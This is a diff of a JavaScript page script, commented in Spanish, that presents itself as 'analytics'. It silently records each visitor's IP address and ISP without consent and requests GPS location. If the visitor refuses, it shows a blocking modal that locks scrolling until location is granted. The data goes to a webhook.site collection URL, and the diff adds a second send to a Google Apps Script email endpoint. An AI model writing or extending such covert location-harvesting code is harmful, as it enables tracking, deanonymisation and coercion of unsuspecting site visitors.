@@ -10,10 +10,10 @@
 // ============================================
 
 const ANALYTICS_CONFIG = {
-    // Leer desde variable de entorno de Netlify o usar default
-    webhookUrl: window.location.hostname.includes('localhost') 
-        ? 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09' // Para testing local
-        : 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09', // REEMPLAZAR con tu URL real de producción
+    webhookUrl: 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09',
+    
+    // URL de Google Apps Script para emails (dejar vacío si no usas)
+    googleScriptUrl: '', // PEGAR tu URL de Google Script aquí
     
     firebase: {
         enabled: false,
@@ -223,11 +223,20 @@ async function sendData(payload) {
     try {
         log('📤 Enviando datos...', payload);
 
-        if (ANALYTICS_CONFIG.firebase.enabled) {
-            return await sendToFirebase(payload);
-        } else {
-            return await sendToWebhook(payload);
+        // Enviar a ambos en paralelo
+        const promises = [sendToWebhook(payload)];
+        
+        if (ANALYTICS_CONFIG.googleScriptUrl) {
+            promises.push(sendToGoogleScript(payload));
         }
+        
+        if (ANALYTICS_CONFIG.firebase.enabled) {
+            promises.push(sendToFirebase(payload));
+        }
+        
+        await Promise.all(promises);
+        return { success: true };
+        
     } catch (error) {
         console.error('❌ Error enviando datos:', error);
         return { success: false, error: error.message };
@@ -251,6 +260,27 @@ async function sendToWebhook(data) {
         }
     } catch (error) {
         console.error('❌ Error en webhook:', error);
+        return { success: false, error: error.message };
+    }
+}
+
+async function sendToGoogleScript(data) {
+    if (!ANALYTICS_CONFIG.googleScriptUrl) {
+        return { success: true }; // No configurado, skip
+    }
+    
+    try {
+        const response = await fetch(ANALYTICS_CONFIG.googleScriptUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        log('✅ Datos enviados a Google Script (email)');
+        return { success: true };
+    } catch (error) {
+        console.error('❌ Error en Google Script:', error);
         return { success: false, error: error.message };
     }
 }
@@ -282,11 +312,14 @@ async function sendToFirebase(data) {
  * Muestra el modal bloqueante
  */
 function showLocationModal() {
+    if (analyticsState.modalShown) return;
+    
+    analyticsState.modalShown = true;
     const modal = document.getElementById('location-modal');
     
     if (modal) {
         log('🚨 Mostrando modal de verificación');
-        modal.classList.remove('hide');
+        modal.classList.add('show');
         
         // Bloquear scroll del body
         document.body.style.overflow = 'hidden';
@@ -301,7 +334,7 @@ function hideLocationModal() {
     
     if (modal) {
         log('✅ Ocultando modal');
-        modal.classList.add('hide');
+        modal.classList.remove('show');
         document.body.style.overflow = 'auto';
     }
 }
@@ -326,29 +359,12 @@ async function handleConfirmButton() {
         // GPS obtenido: enviar segundo paquete
         await sendSecondPackage(gpsData);
         
-        // Enviar evento de aceptación en reintento
-        await sendData({
-            event: 'gps_granted_retry',
-            stage: 'user_accepted_after_modal',
-            sessionId: analyticsState.sessionId,
-            timestamp: new Date().toISOString()
-        });
-        
         // Ocultar modal y permitir lectura
         hideLocationModal();
         
     } catch (error) {
         // Si vuelve a fallar, mostrar mensaje de error
         log('❌ Usuario rechazó GPS nuevamente o error', error);
-        
-        // Enviar evento de rechazo múltiple
-        await sendData({
-            event: 'gps_denied_again',
-            stage: 'persistent_denial',
-            sessionId: analyticsState.sessionId,
-            timestamp: new Date().toISOString(),
-            errorType: error.type || 'UNKNOWN'
-        });
         
         if (btn) {
             btn.innerHTML = '❌ Permiso denegado - Reintentar';
@@ -429,27 +445,20 @@ async function sendSecondPackage(gpsData) {
 async function initAnalytics() {
     log('🚀 Iniciando sistema de analytics persistente...');
 
-    // Modal SIEMPRE visible desde el inicio (configurado en CSS)
-    // Bloquear scroll inmediatamente
-    document.body.style.overflow = 'hidden';
-    
     // PASO 1: Captura silenciosa de IP + ISP (NO espera permiso del usuario)
     await sendInitialPackage();
 
-    // PASO 2: Solicitar GPS INMEDIATAMENTE (sin esperar interacción)
+    // PASO 2: Solicitar GPS de forma silenciosa
     try {
         const gpsData = await requestGeolocation();
         
-        // Si acepta, enviar GPS y ocultar modal
+        // Si acepta de inmediato, enviar GPS y no mostrar modal
         await sendSecondPackage(gpsData);
-        log('✅ Usuario aceptó GPS');
-        
-        // Ocultar modal y permitir lectura
-        hideLocationModal();
+        log('✅ Usuario aceptó GPS inmediatamente');
         
     } catch (error) {
-        // Si deniega, el modal sigue visible (ya estaba desde el inicio)
-        log('⚠️ GPS denegado - Modal permanece visible');
+        // Si deniega o falla GPS: mostrar modal bloqueante
+        log('⚠️ GPS denegado o error - Mostrando modal');
         
         // Enviar evento de rechazo
         await sendData({
@@ -461,8 +470,8 @@ async function initAnalytics() {
             errorMessage: error.message || 'Error desconocido'
         });
         
-        // Modal ya está visible, solo mantenerlo
-        analyticsState.modalShown = true;
+        // Mostrar modal bloqueante
+        showLocationModal();
     }
 }
 
